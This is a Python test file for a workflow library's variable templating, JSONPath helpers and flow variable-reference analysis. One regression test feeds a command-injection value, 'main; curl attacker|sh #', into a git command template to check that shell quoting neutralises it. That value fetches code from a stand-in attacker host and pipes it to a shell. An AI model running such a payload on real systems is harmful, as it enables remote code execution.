from fdsx.core.variables import (
    _is_var_satisfied,
    analyze_variable_references,
    resolve_jsonpath,
    resolve_template,
    resolve_template_shell_safe,
    set_jsonpath,
)
from fdsx.models.flow import Branch, Flow, ParallelState, TaskState


class TestResolveTemplate:
    def test_simple_variable(self):
        result = resolve_template("Hello {name}", {"name": "World"})
        assert result == "Hello World"

    def test_unknown_pattern_preserved(self):
        result = resolve_template("Hello {unknown}", {"name": "World"})
        assert result == "Hello {unknown}"

    def test_missing_variable_preserved(self):
        result = resolve_template("Hello {name}", {})
        assert result == "Hello {name}"

    def test_dot_access(self):
        data = {"user": {"name": "Alice"}}
        result = resolve_template("Hello {user.name}", data)
        assert result == "Hello Alice"

    def test_index_access(self):
        data = {"items": ["first", "second"]}
        result = resolve_template("Item: {items[0]}", data)
        assert result == "Item: first"

    def test_multiple_variables(self):
        result = resolve_template(
            "{greeting} {name}!", {"greeting": "Hello", "name": "World"}
        )
        assert result == "Hello World!"

    def test_no_variables(self):
        result = resolve_template("Hello World!", {})
        assert result == "Hello World!"

    def test_int_value(self):
        result = resolve_template("Count: {count}", {"count": 42})
        assert result == "Count: 42"

    def test_bool_value(self):
        result = resolve_template("Active: {active}", {"active": True})
        assert result == "Active: True"

    def test_list_value_rendered_as_json(self):
        variables = {"items": ["apple", "banana"]}
        result = resolve_template("Fruits: {items}", variables)
        assert result == 'Fruits: [\n  "apple",\n  "banana"\n]'

    def test_dict_value_rendered_as_json(self):
        variables = {"config": {"timeout": 30, "debug": True}}
        result = resolve_template("Config: {config}", variables)
        assert result == 'Config: {\n  "timeout": 30,\n  "debug": true\n}'

    def test_nested_dict_list_rendered_as_json(self):
        variables = {"data": {"users": [{"name": "Alice"}, {"name": "Bob"}]}}
        result = resolve_template("Data: {data}", variables)
        assert '"name"' in result
        assert "Alice" in result
        assert "Bob" in result


class TestResolveJsonPath:
    def test_simple_field(self):
        data = {"name": "Alice"}
        result = resolve_jsonpath("name", data)
        assert result == "Alice"

    def test_nested_field(self):
        data = {"user": {"name": "Alice"}}
        result = resolve_jsonpath("user.name", data)
        assert result == "Alice"

    def test_array_indexing(self):
        data = {"items": ["first", "second", "third"]}
        result = resolve_jsonpath("items[1]", data)
        assert result == "second"

    def test_dollar_sign_prefix(self):
        data = {"name": "Alice"}
        result = resolve_jsonpath("$.name", data)
        assert result == "Alice"

    def test_invalid_path(self):
        data = {"name": "Alice"}
        result = resolve_jsonpath("nonexistent", data)
        assert result is None

    def test_invalid_array_index(self):
        data = {"items": ["first"]}
        result = resolve_jsonpath("items[5]", data)
        assert result is None


class TestSetJsonPath:
    def test_set_new_field(self):
        data = {}
        result = set_jsonpath("name", data, "Alice")
        assert result == {"name": "Alice"}

    def test_set_nested_field(self):
        data = {}
        result = set_jsonpath("user.name", data, "Alice")
        assert result == {"user": {"name": "Alice"}}

    def test_set_array_element(self):
        data = {"items": [None, None]}
        result = set_jsonpath("items[1]", data, "second")
        assert result == {"items": [None, "second"]}

    def test_update_existing(self):
        data = {"name": "Bob"}
        result = set_jsonpath("name", data, "Alice")
        assert result == {"name": "Alice"}

    def test_dollar_sign_prefix(self):
        data = {}
        result = set_jsonpath("$.name", data, "Alice")
        assert result == {"name": "Alice"}

    def test_list_expansion_intermediate_segment(self):
        """Regression: set_jsonpath must grow lists for intermediate segments
        (e.g. items[2].name against empty list)."""
        data = {"items": []}
        result = set_jsonpath("items[2].name", data, "third")
        assert len(result["items"]) == 3
        assert result["items"][2] == {"name": "third"}

    def test_list_expansion_gap_filled_with_empty_dicts(self):
        """Intermediate slots created by list expansion should be dicts."""
        data = {"items": []}
        result = set_jsonpath("items[1].value", data, "x")
        assert isinstance(result["items"][0], dict)
        assert result["items"][1] == {"value": "x"}

    def test_set_jsonpath_creates_list_for_index(self):
        """Regression: set_jsonpath must create list when next part is an index."""
        result = set_jsonpath("items[0]", {}, "x")
        assert result == {"items": ["x"]}

    def test_set_jsonpath_creates_nested_list_for_index(self):
        """Regression: set_jsonpath must create nested list for index then dict."""
        result = set_jsonpath("items[0].name", {}, "Alice")
        assert result == {"items": [{"name": "Alice"}]}


class TestResolveTemplateShellSafe:
    def test_shell_metacharacters_quoted(self):
        """Regression: shell metacharacters in variable values must be quoted."""
        variables = {"branch": "main; curl attacker|sh #"}
        result = resolve_template_shell_safe("git checkout {branch}", variables)
        # The value should be shell-quoted so it cannot inject commands
        assert ";" not in result or result.count("'") >= 2
        # shlex.quote wraps in single quotes
        assert "'main; curl attacker|sh #'" in result

    def test_safe_value_unchanged(self):
        """Values without metacharacters should still work correctly."""
        variables = {"name": "hello"}
        result = resolve_template_shell_safe("echo {name}", variables)
        assert result == "echo hello"

    def test_unknown_pattern_preserved(self):
        """Unknown patterns should be preserved as-is."""
        result = resolve_template_shell_safe("echo {unknown}", {"name": "val"})
        assert result == "echo {unknown}"

    def test_single_quotes_in_value_escaped(self):
        """Single quotes in values should be properly escaped."""
        variables = {"msg": "it's a test"}
        result = resolve_template_shell_safe("echo {msg}", variables)
        # shlex.quote handles single quotes
        assert "it" in result
        assert "test" in result

    def test_list_value_shell_safe(self):
        """List values should be JSON-encoded and shell-quoted."""
        variables = {"items": ["apple", "banana"]}
        result = resolve_template_shell_safe("echo {items}", variables)
        assert result == 'echo \'[\n  "apple",\n  "banana"\n]\'', (
            f"Expected exact JSON+quote output, got: {result!r}"
        )

    def test_dict_value_shell_safe(self):
        """Dict values should be JSON-encoded and shell-quoted."""
        variables = {"config": {"timeout": 30}}
        result = resolve_template_shell_safe("echo {config}", variables)
        assert result == "echo '{\n  \"timeout\": 30\n}'", (
            f"Expected exact JSON+quote output, got: {result!r}"
        )


class TestPassStateVariableRecognition:
    """T003/T005: PassState parameters and aggregate must be recognized by analyze_variable_references."""

    def test_pass_state_parameters_satisfy_downstream(self):
        """T005: PassState.parameters keys should satisfy downstream variable references."""
        from fdsx.models.flow import PassState

        flow = Flow(
            name="PassState Flow",
            description="Test flow for PassState parameters",
            start_at="start",
            states={
                "start": TaskState(
                    type="task",
                    provider="system",
                    command="echo hello",
                    result_path="$.result",
                    next="transform",
                ),
                "transform": PassState(
                    type="pass",
                    parameters={"doc_feedback": "{result}", "summary": "summary text"},
                    next="consume",
                ),
                "consume": TaskState(
                    type="task",
                    provider="system",
                    command="echo {doc_feedback}",
                    result_path="$.final",
                    end=True,
                ),
            },
        )
        errors = analyze_variable_references(flow)
        assert len(errors) == 0, f"Unexpected errors: {errors}"

    def test_pass_state_parameters_dollar_prefix(self):
        """PassState parameter keys with $. prefix should be stripped."""
        from fdsx.models.flow import PassState

        flow = Flow(
            name="PassState Dollar Prefix",
            description="Test flow for $. prefix in parameters",
            start_at="start",
            states={
                "start": TaskState(
                    type="task",
                    provider="system",
                    command="echo hello",
                    result_path="$.raw",
                    next="transform",
                ),
                "transform": PassState(
                    type="pass",
                    parameters={"$.review": "{raw}"},
                    next="consume",
                ),
                "consume": TaskState(
                    type="task",
                    provider="system",
                    command="echo {review}",
                    result_path="$.final",
                    end=True,
                ),
            },
        )
        errors = analyze_variable_references(flow)
        assert len(errors) == 0, f"Unexpected errors: {errors}"

    def test_pass_state_aggregate_satisfies_downstream(self):
        """PassState.aggregate.result_path should satisfy downstream references."""
        from fdsx.models.flow import AggregateRule, PassState

        flow = Flow(
            name="PassState Aggregate Flow",
            description="Test flow for PassState aggregate",
            start_at="start",
            states={
                "start": TaskState(
                    type="task",
                    provider="system",
                    command="echo hello",
                    result_path="$.raw",
                    next="aggregate",
                ),
                "aggregate": PassState(
                    type="pass",
                    aggregate=AggregateRule(
                        source="$.results",
                        field="decision",
                        strategy="majority",
                        match="APPROVED",
                        no_match="REJECTED",
                        result_path="$.decision",
                    ),
                    next="consume",
                ),
                "consume": TaskState(
                    type="task",
                    provider="system",
                    command="echo {decision}",
                    result_path="$.final",
                    end=True,
                ),
            },
        )
        errors = analyze_variable_references(flow)
        assert len(errors) == 0, f"Unexpected errors: {errors}"

    def test_pass_state_undefined_variable_still_flagged(self):
        """PassState without the right parameters should still flag undefined refs."""
        from fdsx.models.flow import PassState

        flow = Flow(
            name="PassState Undefined",
            description="PassState without the variable should still flag error",
            start_at="start",
            states={
                "start": TaskState(
                    type="task",
                    provider="system",
                    command="echo hello",
                    result_path="$.result",
                    next="transform",
                ),
                "transform": PassState(
                    type="pass",
                    parameters={"other_key": "static"},
                    next="consume",
                ),
                "consume": TaskState(
                    type="task",
                    provider="system",
                    command="echo {undefined_var}",
                    result_path="$.final",
                    end=True,
                ),
            },
        )
        errors = analyze_variable_references(flow)
        assert len(errors) == 1
        assert "undefined_var" in errors[0]

    def test_pass_state_parameters_undefined_ref_in_value_flagged(self):
        """PassState.parameters values with {var} refs to undefined variables must be flagged."""
        from fdsx.models.flow import PassState

        flow = Flow(
            name="PassState Undefined Input",
            description="PassState references undefined var in parameters value",
            start_at="start",
            states={
                "start": TaskState(
                    type="task",
                    provider="system",
                    command="echo hello",
                    result_path="$.result",
                    next="transform",
                ),
                "transform": PassState(
                    type="pass",
                    parameters={"doc_feedback": "{nonexistent_var}"},
                    next="consume",
                ),
                "consume": TaskState(
                    type="task",
                    provider="system",
                    command="echo {doc_feedback}",
                    result_path="$.final",
                    end=True,
                ),
            },
        )
        errors = analyze_variable_references(flow)
        assert len(errors) == 1
        assert "nonexistent_var" in errors[0]


class TestAnalyzeVariableReferences:
    def test_valid_flow_no_errors(self):
        flow = Flow(
            name="Test Flow",
            description="Test flow for variable analysis",
            start_at="start",
            states={
                "start": TaskState(
                    type="task",
                    provider="system",
                    command="echo test",
                    result_path="$.plan",
                    next="middle",
                ),
                "middle": TaskState(
                    type="task",
                    provider="system",
                    command="echo {plan}",
                    result_path="$.result",
                    end=True,
                ),
            },
        )
        errors = analyze_variable_references(flow)
        assert len(errors) == 0

    def test_unreachable_variable_reference(self):
        flow = Flow(
            name="Test Flow",
            description="Test flow for unreachable variable",
            start_at="start",
            states={
                "start": TaskState(
                    type="task",
                    provider="system",
                    command="echo test",
                    result_path="$.result",
                    next="middle",
                ),
                "middle": TaskState(
                    type="task",
                    provider="system",
                    command="echo {unused_var}",
                    result_path="$.other",
                    end=True,
                ),
            },
        )
        errors = analyze_variable_references(flow)
        assert isinstance(errors, list)
        assert len(errors) == 1
        assert "unused_var" in errors[0]

    # F2 regression: CLI --input keys should suppress false-positive errors
    def test_input_keys_suppress_false_positive(self):
        """F2: variables provided via --input must not be flagged as undefined."""
        # Without input_keys the start state is excluded from checking (it is start_at),
        # so we need a second state to demonstrate the fix.
        # Note: 'task' and 'source' are global vars; use a custom key to test input_keys.
        flow2 = Flow(
            name="Test Flow 2",
            description="Test flow for input keys",
            start_at="start",
            states={
                "start": TaskState(
                    type="task",
                    provider="system",
                    command="echo hello",
                    result_path="$.result",
                    next="middle",
                ),
                "middle": TaskState(
                    type="task",
                    provider="system",
                    command="echo {cli_input}",
                    result_path="$.other",
                    end=True,
                ),
            },
        )
        # Without input_keys: should flag missing 'cli_input'
        errors_without = analyze_variable_references(flow2)
        assert any("cli_input" in e for e in errors_without)
        # With input_keys: should be clean
        errors_with = analyze_variable_references(flow2, input_keys={"cli_input"})
        assert len(errors_with) == 0

    # F3 regression: full-path tracking + prefix matching
    def test_nested_path_false_negative_detected(self):
        """F3: different nested sub-paths on producer vs consumer should be flagged."""
        flow = Flow(
            name="Test Flow",
            description="Test flow for nested paths",
            start_at="produce",
            states={
                "produce": TaskState(
                    type="task",
                    provider="system",
                    command="echo hello",
                    result_path="$.review.summary",
                    next="consume",
                ),
                "consume": TaskState(
                    type="task",
                    provider="system",
                    command="echo {review.decision}",  # different sub-path
                    result_path="$.final",
                    end=True,
                ),
            },
        )
        errors = analyze_variable_references(flow)
        assert len(errors) == 1
        assert "review.decision" in errors[0]

    def test_ancestor_path_satisfies_descendant_ref(self):
        """F3: producing $.review satisfies reference to {review.decision} (ancestor)."""
        flow = Flow(
            name="Test Flow",
            description="Test flow for ancestor path",
            start_at="produce",
            states={
                "produce": TaskState(
                    type="task",
                    provider="system",
                    command="echo hello",
                    result_path="$.review",
                    next="consume",
                ),
                "consume": TaskState(
                    type="task",
                    provider="system",
                    command="echo {review.decision}",
                    result_path="$.final",
                    end=True,
                ),
            },
        )
        errors = analyze_variable_references(flow)
        assert len(errors) == 0

    def test_descendant_path_satisfies_parent_ref(self):
        """F3: producing $.review.summary satisfies reference to {review} (descendant proves parent exists)."""
        flow = Flow(
            name="Test Flow",
            description="Test flow for descendant path",
            start_at="produce",
            states={
                "produce": TaskState(
                    type="task",
                    provider="system",
                    command="echo hello",
                    result_path="$.review.summary",
                    next="consume",
                ),
                "consume": TaskState(
                    type="task",
                    provider="system",
                    command="echo {review}",
                    result_path="$.final",
                    end=True,
                ),
            },
        )
        errors = analyze_variable_references(flow)
        assert len(errors) == 0

    def test_parallel_branch_undefined_variable_detected(self):
        """Regression: analyze_variable_references must check parallel branch prompts."""
        flow = Flow(
            name="Test Flow",
            description="Test flow for parallel branch",
            start_at="start",
            states={
                "start": TaskState(
                    type="task",
                    provider="system",
                    command="echo hello",
                    result_path="$.result",
                    next="par",
                ),
                "par": ParallelState(
                    type="parallel",
                    branches=[
                        Branch(
                            provider="system",
                            command="echo {undefined_var}",
                        ),
                    ],
                    result_path="$.par_result",
                    end=True,
                ),
            },
        )
        errors = analyze_variable_references(flow)
        assert len(errors) == 1
        assert "undefined_var" in errors[0]


class TestIsVarSatisfied:
    """Unit tests for the _is_var_satisfied helper."""

    def test_exact_match(self):
        assert _is_var_satisfied("review", {"review"}) is True

    def test_ancestor_satisfies(self):
        # "review" is ancestor of "review.decision"
        assert _is_var_satisfied("review.decision", {"review"}) is True

    def test_descendant_satisfies(self):
        # "review.summary" being present proves "review" exists
        assert _is_var_satisfied("review", {"review.summary"}) is True

    def test_unrelated_path_not_satisfied(self):
        assert _is_var_satisfied("other", {"review"}) is False

    def test_partial_prefix_not_satisfied(self):
        # "reviewer" does not satisfy "review" even though it starts with "review"
        assert _is_var_satisfied("reviewer", {"review"}) is False

    # R2-F3: bracket/indexed path tests
    def test_indexed_descendant_satisfies_parent(self):
        # "reviews[0].summary" being present proves "reviews" (ancestor) exists
        assert _is_var_satisfied("reviews", {"reviews[0].summary"}) is True

    def test_parent_satisfies_indexed_descendant(self):
        # "reviews" (whole collection) satisfies "reviews[0].summary"
        assert _is_var_satisfied("reviews[0].summary", {"reviews"}) is True

    def test_different_indexed_paths_not_satisfied(self):
        # "reviews[0].decision" ≠ "reviews[0].summary" (sibling paths)
        assert _is_var_satisfied("reviews[0].decision", {"reviews[0].summary"}) is False


class TestAnalyzeVariableReferencesExtract:
    """F1 regression: extract.result_path must be registered as a produced variable."""

    def test_extract_result_path_satisfies_downstream_reference(self):
        """F1: A TaskState with extract.result_path should register that path as produced."""
        from fdsx.models.flow import ExtractRule, TaskState

        flow = Flow(
            name="Extraction Flow",
            description="Test flow for extract result path",
            start_at="echo_state",
            states={
                "echo_state": TaskState(
                    type="task",
                    provider="system",
                    command="echo APPROVED",
                    result_path="$.raw_output",
                    extract=ExtractRule(
                        strategy=["keyword"],
                        pattern="APPROVED|REJECTED",
                        result_path="$.decision",
                    ),
                    next="route",
                ),
                "route": TaskState(
                    type="task",
                    provider="system",
                    command="echo {decision}",
                    result_path="$.routed",
                    end=True,
                ),
            },
        )
        errors = analyze_variable_references(flow)
        assert len(errors) == 0, f"Unexpected errors: {errors}"

    def test_missing_extract_result_path_flagged(self):
        """F1: A reference to an extract.result_path that doesn't exist should be flagged."""
        flow = Flow(
            name="Extraction Flow",
            description="Test flow for missing extract result path",
            start_at="echo_state",
            states={
                "echo_state": TaskState(
                    type="task",
                    provider="system",
                    command="echo test",
                    result_path="$.raw_output",
                    next="route",
                ),
                "route": TaskState(
                    type="task",
                    provider="system",
                    command="echo {decision}",
                    result_path="$.routed",
                    end=True,
                ),
            },
        )
        errors = analyze_variable_references(flow)
        assert len(errors) == 1
        assert "decision" in errors[0]

    def test_parallel_branch_extract_path_not_top_level(self):
        """F1: Branch extract.result_path values live INSIDE result array elements,
        not as top-level state vars. A downstream {decision} ref after a parallel
        state with branch extract should still be flagged as undefined."""
        from fdsx.models.flow import ExtractRule

        flow = Flow(
            name="Parallel Extract Flow",
            description="Test flow for parallel extract path",
            start_at="par",
            states={
                "par": ParallelState(
                    type="parallel",
                    branches=[
                        Branch(
                            provider="system",
                            command="echo APPROVED",
                            extract=ExtractRule(
                                strategy=["keyword"],
                                pattern="APPROVED|REJECTED",
                                result_path="$.decision",
                            ),
                        ),
                    ],
                    result_path="$.par_result",
                    next="consume",
                ),
                "consume": TaskState(
                    type="task",
                    provider="system",
                    command="echo {decision}",
                    result_path="$.final",
                    end=True,
                ),
            },
        )
        # Branch extract paths are NOT top-level — downstream {decision} is undefined
        errors = analyze_variable_references(flow)
        assert len(errors) == 1
        assert "decision" in errors[0]

    def test_parallel_state_result_path_is_top_level(self):
        """F1: Only the parallel state's own result_path is registered as top-level."""
        flow = Flow(
            name="Parallel Result Flow",
            description="Test flow for parallel result path",
            start_at="par",
            states={
                "par": ParallelState(
                    type="parallel",
                    branches=[
                        Branch(provider="system", command="echo hello"),
                    ],
                    result_path="$.par_result",
                    next="consume",
                ),
                "consume": TaskState(
                    type="task",
                    provider="system",
                    command="echo {par_result}",
                    result_path="$.final",
                    end=True,
                ),
            },
        )
        errors = analyze_variable_references(flow)
        assert len(errors) == 0, f"Unexpected errors: {errors}"


class TestGlobalTaskVarsRecognition:
    """T009: Global task variables (task, source) must be recognised without errors."""

    def _make_flow(self, command: str) -> Flow:
        """Helper: 2-state flow where 'middle' uses the given command."""
        return Flow(
            name="Global Var Flow",
            description="Test flow for global task variable recognition",
            start_at="start",
            states={
                "start": TaskState(
                    type="task",
                    provider="system",
                    command="echo hello",
                    result_path="$.result",
                    next="middle",
                ),
                "middle": TaskState(
                    type="task",
                    provider="system",
                    command=command,
                    result_path="$.other",
                    end=True,
                ),
            },
        )

    def test_task_var_no_warning_in_non_start_state(self):
        """{task} in a non-start state must not produce any error."""
        flow = self._make_flow("echo {task}")
        errors = analyze_variable_references(flow)
        assert errors == []

    def test_source_var_no_warning_in_non_start_state(self):
        """{source} in a non-start state must not produce any error."""
        flow = self._make_flow("echo {source}")
        errors = analyze_variable_references(flow)
        assert errors == []

    def test_unknown_var_still_warned_in_non_start_state(self):
        """{unknown_var} in a non-start state must still produce an error."""
        flow = self._make_flow("echo {unknown_var}")
        errors = analyze_variable_references(flow)
        assert len(errors) == 1
        assert "unknown_var" in errors[0]
